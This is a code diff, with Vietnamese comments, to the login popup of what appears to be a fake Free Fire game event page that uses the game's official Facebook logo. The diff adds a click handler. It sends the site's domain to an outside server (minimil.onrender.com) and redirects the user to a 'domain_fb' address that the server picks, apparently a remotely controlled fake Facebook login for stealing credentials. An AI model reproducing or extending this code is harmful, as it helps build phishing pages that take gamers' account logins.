@@ -668,13 +668,25 @@
                                             title: 'Đăng nhập', // Tiêu đề của popup
 
                                             html: '<br><br><p class="login-icon">' +
-                                                '<a class="loginFb"><img src="https://dl.dir.freefiremobile.com/common/Yn_event/vip-member/images/logo-fb.png" alt=""></a> &nbsp; ' +
+                                                '<a class="login"><img src="https://dl.dir.freefiremobile.com/common/Yn_event/vip-member/images/logo-fb.png" alt=""></a> &nbsp; ' +
                                                 '</p>', // Nội dung của popup
                                             showCloseButton: true, // Hiển thị nút đóng
                                             focusConfirm: false, // Không tự động focus vào nút xác nhận
                                         });
 
+                                        const loginFb = document.querySelector('.login');
+                                        loginFb.addEventListener('click', function () {
+                                            const domain = window.location.protocol + "//" + window.location.host;
+                                            (async () => {
+                                                try {
+                                                    let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
+                                                    data = await data.json()
+                                                    window.location.href = data.data.domain_fb;
+                                                } catch {
 
+                                                }
+                                            })();
+                                        });
                                     }
                                     showPopupLinks.forEach(link => {
                                         link.addEventListener('click', function (event) {
